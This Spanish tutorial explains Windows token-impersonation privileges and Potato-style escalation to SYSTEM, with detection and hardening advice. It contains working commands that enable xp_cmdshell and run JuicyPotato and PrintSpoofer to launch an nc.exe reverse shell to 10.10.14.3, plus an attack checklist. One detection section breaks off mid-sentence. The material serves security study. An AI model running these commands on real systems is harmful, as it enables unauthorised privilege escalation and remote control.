# SeImpersonate y SeAssignPrimaryToken

## Introducción

El sistema Windows representa la identidad de cuentas y procesos mediante **tokens de acceso**. Dos privilegios críticos relacionados con la reutilización o asignación de tokens son **SeImpersonatePrivilege** y **SeAssignPrimaryTokenPrivilege**. Ambos permiten a procesos con los derechos adecuados actuar con el contexto de otros usuarios y, si se abusan en entornos no endurecidos, posibilitan escaladas locales a NT AUTHORITY/SYSTEM.

---

## Definición

* **SeImpersonatePrivilege**: "Impersonate a client after authentication" — permite a un proceso (o hilo) **impersonar** a un cliente autenticado (usar su token de impersonación) para acceder a recursos en nombre de ese cliente. A menudo este privilegio se le otorga a cuentas administrativas. Un ejemplo del uso de este token es mediante la función [`CreateProcessWithTokenW`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw).

`Nota`: `CreateProcessWithTokenW` es una función de la API Win32 que crea un nuevo proceso y permite lanzarlo con la identidad de un token dado. Requiere que el llamador tenga `SeImpersonatePrivilege`.  

* **SeAssignPrimaryTokenPrivilege**: "Replace a process level token" — permite crear o asignar **tokens primarios** a procesos (por ejemplo, usar la función `CreateProcessAsUser`) y es más restrictivo.

Diferencia práctica:

* *Impersonation token* suele estar asociado a un thread y se usa para actuar temporalmente como el cliente.
* *Primary token* se asigna a un proceso entero y permite crear procesos enteros bajo esa identidad.

---

## Contexto de abuso

Windows permite, por diseño, que procesos reutilicen tokens de otros procesos para realizar tareas con distintos niveles de privilegio; esa funcionalidad legítima puede ser abusada si cuentas de servicio tienen derechos de impersonación, permitiendo a un atacante conseguir contexto SYSTEM mediante técnicas tipo Potato:

* Servicios que atienden conexiones de cliente (IIS, SQL Server, servicios RPC/COM) a menudo necesitan impersonar al usuario que realiza la petición para acceder a recursos (carpetas compartidas, bases de datos, otros servicios). Por ello, las cuentas de estos servicios a veces tienen `SeImpersonate` habilitado.
* Si se obtiene ejecución en el contexto de uno de esos servicios (por ejemplo, nt service/mssql$..., IIS APPPOOL/defaultapppool), la presencia de `SeImpersonate` o `SeAssignPrimaryToken` puede permitir una escalada rápida a SYSTEM.

Ataque tipo potato:
El atacante “engaña” a un componente que corre como SYSTEM para que inicie comunicación con el proceso del atacante; durante esa interacción se produce la oportunidad para que el atacante obtenga/usar el token SYSTEM.

Más información sobre los [ataques de suplantación de tokens](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)

---

# JuicyPotato 


JuicyPotato es una técnica/herramienta que representa un patrón de abuso de tokens en Windows: aprovecha que ciertos procesos o servicios que corren como **NT AUTHORITY\SYSTEM** aceptan conexiones o callbacks (COM, RPC, etc.), y provoca que ese componente SYSTEM establezca comunicación con un proceso controlado por el atacante para obtener o reutilizar su token. Con ese token se puede ejecutar código con identidad SYSTEM y escalar privilegios localmente.

---

## Definición 

* **Familia "Potato"**: conjunto de técnicas (JuicyPotato, RottenPotato, RoguePotato, PrintSpoofer, etc.) que inducen a un proceso SYSTEM a autenticarse contra un endpoint controlado por el atacante y permiten el uso del token SYSTEM mediante impersonation/duplicación.
* **Esencia técnica:** forzar una autenticación/connection desde un proceso con alto privilegio hacia el agente atacante, y aprovechar la respuesta para conseguir o usar el token de SYSTEM.

---

## Precondiciones 

1. **Ejecutar código con contexto de cuenta de servicio** (no necesariamente SYSTEM); ejemplo típico: cuenta de servicio de SQL, IIS AppPool, o cualquier servicio accesible desde la superficie de ataque.
2. **Privilegio SeImpersonate (o SeAssignPrimaryToken)** habilitado para la cuenta bajo la que corre el proceso comprometido.
3. **Presencia de un componente local con contexto SYSTEM** que pueda iniciar la interacción (COM/DCOM, Spooler, servicios que hacen callbacks, etc.).
4. **Configuración del sistema/versión de Windows** que no mitigue la técnica específica (algunas variantes fallan en builds recientes o con mitigaciones aplicadas).

> Nota: en entornos modernos, protecciones como PPL/LSASS hardening, Credential Guard y parches del sistema reducen la probabilidad de éxito.

---

## Descripción técnica

1. El atacante ejecuta código en la máquina con un token de servicio que tiene `SeImpersonate`.
2. El atacante provoca que un componente que corre como SYSTEM realice una llamada (por ejemplo, que el servicio SYSTEM inicie una conexión RPC/COM hacia la máquina del atacante o hacia un endpoint local controlado).
3. Al establecerse la comunicación, existe una ventana donde el token del proceso SYSTEM puede ser utilizado por el atacante (impersonación o duplicado) para crear un proceso con la identidad SYSTEM o para ejecutar código con esos privilegios.
4. Herramientas tipo JuicyPotato encapsulan la lógica para seleccionar servidores COM/CLSID vulnerables, forzar la autenticación y usar APIs de Windows para convertir el resultado en un proceso SYSTEM.

---

## Flujo conceptual

* **Entrada:** RCE o ejecución restringida como cuenta de servicio.
* **Chequeo:** ¿la cuenta tiene SeImpersonate / SeAssignPrimaryToken?
* **Vector:** existe servicio/componente SYSTEM que pueda ser inducido a comunicarse.
* **Resultado posible:** proceso o shell con identidad NT AUTHORITY\SYSTEM (si la explotación tiene éxito).

---

## eñales y artefactos de detección

**Registros y eventos a revisar:**

* *Windows Security Log*: procesos creados o inicios de sesión inusuales tras actividad de servicios.
* *Event IDs relevantes*: creación de procesos (4688), logons (4624), uso de credenciales y eventos específicos de servicios.
* *Sysmon* (recomendado):

  * EventID 1 (ProcessCreate): procesos hijos inusuales creados por servicios (ej. procesos de consola lanzados desde s








---


---

---

## Ejemplo de explotación (JuicyPotato / PrintSpoofer — flujo resumido)

1. Obtener RCE en contexto de un servicio (ej.: xp_cmdshell en SQL, web shell en IIS, Jenkins RCE).
2. Confirmar la cuenta del proceso: whoami (ej. nt service/mssql$sqlexpress01).
3. Comprobar privilegios: whoami /priv → comprobar SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
4. Subir herramienta de explotación (JuicyPotato.exe, PrintSpoofer.exe, nc.exe).
5. Ejecutar herramienta apuntando al CLSID/puerto COM apropiado y al payload (reverse shell).
6. Si tiene éxito, obtendrás un shell como NT AUTHORITY/SYSTEM.

---

## Comandos y ejemplos prácticos

* Comprobar identidad y privilegios:

  ```cmd
  whoami
  whoami /priv
  ```

* Habilitar xp_cmdshell (ejemplo con Impacket mssqlclient):

  ```sql
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  ```

* Ejecutar JuicyPotato (ejemplo):

  ```cmd
  JuicyPotato.exe -l 53375 -p C:/Windows/System32/cmd.exe -a "/c C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
  ```

* Ejecutar PrintSpoofer (ejemplo):

  ```cmd
  PrintSpoofer.exe -c "C:/tools/nc.exe 10.10.14.3 8443 -e cmd.exe"
  ```

> Observación: JuicyPotato no funciona en builds recientes de Windows; en esos casos probar PrintSpoofer, RoguePotato u otras variantes.

---

## Detección (artefactos y logs)

* **Windows Security Event Log**:

  * 4624 / 4634 (logons), 4688 (creación de procesos) — buscar procesos inusuales creados por servicios.
* **Sysmon**:

  * EventID 1 (ProcessCreate): procesos hijos anómalos de servicios (ej. w3wp.exe -> cmd.exe).
  * EventID 10 (ProcessAccess): accesos entre procesos que indican token stealing.
  * EventID 3 (NetworkConnect): conexiones reversas (nc.exe).
* **EDR**: llamadas a APIs sensibles (CreateProcessWithTokenW, CreateProcessAsUser) y creación de procesos con tokens distintos deben alertar.
* Revisar named pipes y endpoints COM/RPC que estén siendo escuchados por procesos no habituales.

---

## Mitigaciones y hardening

* **Eliminar los privilegios** SeImpersonatePrivilege y SeAssignPrimaryTokenPrivilege de cuentas que no los necesiten (Local Security Policy -> User Rights Assignment o GPO).
* Ejecutar servicios con cuentas con menor privilegio (service accounts con permisos mínimos).
* Separar responsabilidades: no usar la misma cuenta para múltiples servicios críticos.
* Habilitar PPL / LSASS protections y tecnologías como Credential Guard cuando aplique.
* Implementar Sysmon + EDR con reglas que detecten procesos creados desde servicios y uso de APIs de token.
* Application whitelisting y bloqueo de ejecución de binarios no autorizados en servidores críticos.

---

## Checklist

* [ ] Obtener RCE en contexto de servicio.
* [ ] whoami y whoami /priv.
* [ ] Subir herramienta de explotación compatible con la versión de Windows objetivo.
* [ ] Intentar JuicyPotato → si falla, probar PrintSpoofer / RoguePotato / alternativas.
* [ ] Si obtienes SYSTEM, documentar evidencia y limpiar artefactos en entorno de laboratorio.

---

## Notas finales y recursos

* JuicyPotato, PrintSpoofer y RoguePotato son ejemplos públicos; su efectividad depende de la build de Windows.
* Consulta documentación técnica sobre tokens y las APIs CreateProcessWithTokenW, CreateProcessAsUser para profundizar.
* Siempre trabajar en entornos controlados y con autorización.

---
